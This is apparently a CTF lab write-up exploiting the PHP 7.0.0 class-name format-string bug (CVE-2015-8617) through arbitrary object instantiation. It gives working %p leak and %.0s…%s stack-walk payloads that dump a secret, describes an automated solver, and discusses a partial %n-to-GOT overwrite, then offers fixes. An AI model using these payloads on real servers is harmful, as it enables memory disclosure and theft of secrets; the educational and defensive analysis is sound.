# 03 — Format-String Oriented Programming — Writeup

## TL;DR

PHP 7.0.0 shipped a C-level format-string bug (bug #71105 / CVE-2015-8617): the
"Class '%s' not found" error path passed the attacker-controlled class name into
PHP's own `printf` (`main/spprintf.c`) **as the format string**. Combined with
arbitrary object instantiation (`new $_GET['driver']()`), a class name of `%p`
leaks stack words and `%.0s…%s` walks the stack and dereferences a word as a C
string. The challenge builds a licence blob containing the flag on the heap right
before the vulnerable `new`, so a pointer to it sits on the stack; the solver
sweeps stack slots with `%.0s…%s` until `%s` prints the blob. Flag:
`PHRACK{bug_71105_taught_the_new_operator_to_speak_printf}`.

## The bug

### Two primitives on one line

`challenge/src/index.php` walks a licence string and, for every `driver:xxx`
slot, instantiates the operator-selected driver class:

```php
$driver = isset($_GET['driver']) ? $_GET['driver'] : 'NullDriver';
preg_replace_callback('~driver:([a-z]+)~', function (array $m) use ($driver, &$slots) {
    $probe = new $driver();      // (1) arbitrary object instantiation
    ...
}, $licence);
```

`(1)` is **arbitrary object instantiation**: the attacker fully controls which
class `new` looks up. When that class does not exist, PHP raises
`Error: Class '<name>' not found`. In PHP 7.0.0 that message is built like this
(`Zend/zend_execute_API.c`, `zend_throw_or_error`):

```c
/* Zend/zend_execute_API.c ~line 212 */
static void zend_throw_or_error(int fetch_type, zend_class_entry *exception_ce,
                                const char *format, ...) {
    va_list va;
    char *message = NULL;
    va_start(va, format);
    zend_vspprintf(&message, 0, format, va);        /* line 218 */
    if (fetch_type & ZEND_FETCH_CLASS_EXCEPTION) {
        zend_throw_error(exception_ce, message);    /* line 221  <-- BUG */
    } else {
        zend_error(E_ERROR, "%s", message);
    }
    ...
}
```

The caller does the right thing:
`zend_throw_or_error(..., "Class '%s' not found", class_name)` — the class name is
an *argument* to a constant format. The problem is line 221: `message` (which now
literally contains the class name, e.g. `Class '%p' not found`) is passed to
`zend_throw_error(exception_ce, message)` whose signature is
`zend_throw_error(zend_class_entry*, const char *format, ...)`. So the fully
attacker-influenced `message` becomes a **format string** a second time. When the
exception is uncaught, `zend_exception_error()` renders it and it flows through
`zend_vspprintf` → `xbuf_format_converter` in `main/spprintf.c` once more, this
time with an empty argument list — a classic uninitialised-`va_list` format-string
bug.

This is why `?driver=%p-%p-%p` produces:

```
Fatal error: Uncaught Error: Class '0x23-0-0x7f...048' not found in ...
```

`%p` was not treated as a class name — it was interpreted by `printf`.

### Why only 7.0.0

The `Throwable` interface was new in 7.0, and this error path was rewritten to go
through it. The fix (7.0.1, upstream commit `b101a6bb…`, CVE-2015-8617) changed
line 221 to:

```c
zend_throw_error(exception_ce, "%s", message);   /* message is now data */
```

Confirmed against the images in this environment:

```
php 7.0.0  ->  Class '0x1a-0-0x7f...2e8' not found      (format string interpreted)
php 7.0.9  ->  Class '%p-%p-%p' not found               (fixed: printed literally)
php 7.4    ->  Class '%p-%p-%p' not found               (fixed)
```

### What PHP's formatter actually supports

PHP does not use libc `printf`; it has its own `xbuf_format_converter` in
`main/spprintf.c`. Feeding it class names (via `new $c()`) on the shipped
`php:7.0.0` binary gives the ground truth below. "leaks" = consumes a
`va_arg` word and prints it; "crashes" = dereferences an invalid pointer and
segfaults the worker.

| Specifier            | Behaviour on PHP 7.0.0                                              |
|----------------------|--------------------------------------------------------------------|
| `%p`                 | leaks one word as `0x…` (the read primitive)                       |
| `%x` `%X` `%o` `%u` `%d` `%c` | leak one word, formatted; `%c` prints the low byte       |
| `%f` `%e` `%g`       | consume a double arg, print a float (no crash)                     |
| `%s`                 | **dereferences** the word as `char*` and prints it — string read; crashes on a bad pointer |
| `%.Ns` (N>0)         | `strnlen(ptr, N)` then print — also dereferences; crashes on a bad pointer |
| `%.0s`               | `strnlen(ptr, 0)` returns 0 **without** touching memory → safe stack-walk step |
| width / `0`-pad / `-`| honoured: `%10p`, `%08x`, `%020d`, `%-10p` all work                |
| `*` width/precision  | honoured: `%*d`, `%.*s` (consume an extra int arg)                 |
| `l z j t h I64 I32 L`| length modifiers parsed (`%ld`, `%zd`, `%lp`, …)                   |
| `%n`                 | **write primitive**: `*(int*)va_arg = chars_written_so_far`; crashes unless the word is a writable pointer |
| `%N$p` / `%N$s`      | **NOT supported** — no positional args; the `$` is dropped, `%1$p` renders as `%$p`. You must walk sequentially. |
| `%b` `%v` `%y`       | `%b`/`%y` unknown → printed literally; `%v` aliases `%s` (deref)   |
| `%%`                 | literal `%`                                                        |

Relevant source (`main/spprintf.c`):

```c
case 's':                              /* line 604 */
    s = va_arg(ap, char *);
    if (!adjust_precision) s_len = strlen(s);
    else                   s_len = strnlen(s, precision);   /* .0 -> no deref */
    ...
case 'n':                              /* line 743 */
    *(va_arg(ap, int *)) = ... xbuf->len ...;               /* write primitive */
    goto skip_output;
```

The two facts that shape the whole exploit: **`%s` gives an arbitrary-pointer
string read**, and **`%.0s` advances the `va_list` without dereferencing** — so
`%.0s` × N followed by `%s` reads the (N+1)th stack word as a string.

## Building the exploit

All requests go to `http://127.0.0.1:8003/?driver=<url-encoded payload>`.

### Step 1 — confirm the format string is live

```
?driver=%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p
Class '0x35|0|0x7f..058|0x2a|0x7f..1e0|0x30..020|0x7ffc..b30|0x7ffc..a70|
       0x7ffc..a40|0x7f..018|0x7f..018|0x7f..058' not found
```

Words are being pulled off the stack. Slots 6–8 are stack addresses (`0x7ffc…`),
slots 9–10 are heap addresses (`0x7f…`) — and both heap words are equal, a strong
hint they point at the same live object (the licence `subject` string that
`preg_replace_callback` is iterating).

### Step 2 — turn a leak into a string read

`%s` dereferences. Blindly `%s` on slot 0 (`0x35`) segfaults the worker (HTTP
502) — that's expected and harmless, php-fpm respawns it. Walk to the heap slot
instead. `%.0s` is a no-deref step, so:

```
?driver=%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%s     (9 × %.0s, then %s)
Class '-----BEGIN FLEET LICENCE-----
node=web-01
issued=2015-12-11
deploy_key=PHRACK{bug_71105_taught_the_new_operator_to_speak_printf}
slots=driver:cache driver:queue driver:mailer
-----END FLEET LICENCE-----
' not found in ...
```

The 10th `va_arg` word (slot index 9) is the pointer to the licence blob, and
`%s` prints the whole thing, deploy key included.

### Step 3 — make it robust

The solver does not hard-code slot 9. It sweeps `N = 0…24`, sending
`("%.0s" * N) + "%s"` each time, and stops when the response contains the licence
marker / a `PHRACK{…}`. Non-pointer slots segfault the worker (502); the solver
retries a couple of times (the pool is `pm = static`, so a fresh worker is always
warm) and moves on. Offset 9 is stable across container restarts because it is
fixed by the call path (`preg_replace_callback` → user closure → `new`), not by
ASLR — ASLR randomises the *addresses*, not *which stack slot* holds the subject
pointer.

## The exploit

See `solve/solve.py` (Python 3 stdlib only). Stages:

1. `wait_up()` — poll `GET /` until `fleet-console` answers.
2. `stage1_leak_stack()` — `%p × 12`, print the leaked words. Educational proof
   that attacker input is being interpreted as a printf format.
3. `stage2_dump_licence()` — sweep `("%.0s"*n)+"%s"` for `n` in `0..24`, retrying
   on worker segfaults (502/504), until `%s` prints the licence blob; extract the
   `PHRACK{…}` deploy key and print it as `FLAG: …`.

```
[*] stage 1: leaking stack words with %p (bug #71105)
      slot  9 = 0x7f7588069018
      slot 10 = 0x7f7588069018
[*] stage 2: dereferencing stack slots with %.0s*n + %s
[+] slot 9 holds the licence pointer; %s dumped it
FLAG: PHRACK{bug_71105_taught_the_new_operator_to_speak_printf}
```

## Fixing it

Two independent bugs, fix either and the chain breaks:

1. **The PHP bug (already fixed upstream).** Never pass user-influenced data as a
   format string. PHP 7.0.1 changed `zend_throw_error(exception_ce, message)` to
   `zend_throw_error(exception_ce, "%s", message)`. Any binary ≥ 7.0.1 is immune.

2. **The application bug.** Do not instantiate classes by an unvalidated name:

   ```php
   $ALLOWED = ['NullDriver' => NullDriver::class, 'local' => LocalDriver::class];
   $key = $_GET['driver'] ?? 'NullDriver';
   if (!isset($ALLOWED[$key])) { http_response_code(400); exit('unknown driver'); }
   $probe = new $ALLOWED[$key]();
   ```

   An allow-list of concrete class names removes the arbitrary-instantiation
   primitive entirely — the attacker can no longer reach *any* class-not-found
   path, format string or not. Also run `display_errors = Off` in production so
   error text never reaches the client (this lab turns it on deliberately).

## Going further

### The `%n` write-to-RCE escalation (attempted — NOT achieved here)

The article escalates the same bug to RCE by using `%n` to partially overwrite
`GOT[free]` so a later `free()` calls `system()` with attacker-controlled data.
I verified the pieces but did **not** land RCE in this environment. Honest status:

- **The `%n` write primitive is live.** Walking to a stack slot that already holds
  a writable pointer and then writing with `%n` does *not* crash the worker
  (`("%c"*6)+"%n"` returns HTTP 200), so the formatter really does perform the
  write. Bad-pointer slots segfault (`%n` at slot 0 → 502), exactly as expected.
- **Mitigations are NOT the blocker.** `readelf` on the shipped official binary
  (`/usr/local/sbin/php-fpm`, see below) shows **no PIE (ET_EXEC), no RELRO, no
  BIND_NOW, no stack canary**. The GOT is at a *fixed*, *writable* address —
  `free@got.plt` is at `0x0000000000f08ba0`. Contrary to the usual assumption,
  the stock `php:7.0.0` image is *not* hardened, so a source rebuild with
  `-no-pie -z norelro` is **not** required for the write target to exist.
- **The real blocker is the PHP formatter, not the loader.** Two properties of
  `xbuf_format_converter` defeat the classic GOT overwrite:
  1. **No positional arguments.** libc lets you do `%N$n` to aim a write at the
     Nth stack word; PHP's formatter has no `$` handling (confirmed: `%1$p`
     renders as `%$p`). You can only advance the `va_list` one word at a time.
  2. **The format string is not on the stack.** In a textbook FSB the format
     string lives in a stack buffer, so you embed the target address (`&GOT[free]`)
     as raw bytes and point a `%n` back at it. Here the class name is a
     heap-allocated `zend_string`; the only writable addresses reachable by `%n`
     are whatever pointers *already* sit on the stack (stack self-addresses),
     none of which is `&GOT[free]`. Getting `&GOT[free]` onto the stack in a
     `va_arg` position, with no positional args and one `va_list` pass per
     request, is the crux the article solves with a delicate multi-write dance
     ("move a heap pointer on stack to `GOT(free)-2`", then partial overwrite). I
     did not reproduce that multi-stage write chain within the time budget.

  So: **read/disclosure is fully weaponised and automated; the `%n`→RCE step is
  demonstrated to *fire* but is left un-weaponised, with the blocker documented.**
  This lab therefore ships the disclosure attack as the graded objective and
  marks RCE as an open stretch goal, per the challenge design.

### Shipped-binary mitigations (`readelf`/checksec)

Measured on the exact binary the container runs, `/usr/local/sbin/php-fpm` from
`php:7.0.0-fpm` (identical posture for `/usr/local/bin/php` in `-cli`):

| Mitigation      | Status            | Evidence                                            |
|-----------------|-------------------|-----------------------------------------------------|
| PIE / ASLR-exec | **No PIE**        | `readelf -h` → `Type: EXEC` (fixed base `0x400000`) |
| RELRO           | **None**          | `readelf -l` → no `GNU_RELRO` segment               |
| BIND_NOW        | **No** (lazy)     | `readelf -d` → no `BIND_NOW`; `.got.plt` writable    |
| Stack canary    | **None**          | no `__stack_chk_fail` import                          |
| NX              | **Enabled**       | `readelf -l` → `GNU_STACK … RW` (no `X`)             |
| GOT[free]       | fixed & writable  | `free@got.plt` at `0x0000000000f08ba0` (`.got.plt` = `WA`) |

The weak posture is *why* the article's RCE is even conceivable; the PHP-level
constraints above are what make it hard in practice.

## References

- Orange Tsai, *"The Art of PHP — My CTF Journey and Untold Stories!"*, Phrack
  #72, §1.1 "Formatting Objects for Fun and Profit!".
- PHP bug #71105, *"Format String Vulnerability in Class Name Error Message"*,
  reported by Andrew (andrew@jmpesp.org): <https://bugs.php.net/bug.php?id=71105>.
- CVE-2015-8617. Fixed in PHP 7.0.1 (upstream commit `b101a6bbd4f2181c360bd38e7683df4a03cba83e`).
- Arbitrary object instantiation as an attack primitive — background credited by
  Orange Tsai to the object-injection research lineage (2015 onward).
- PHP source read in this lab: `Zend/zend_execute_API.c` (`zend_throw_or_error`),
  `Zend/zend.c` (`zend_throw_error`), `Zend/zend_exceptions.c`
  (`zend_exception_error`), `main/spprintf.c` (`xbuf_format_converter`).
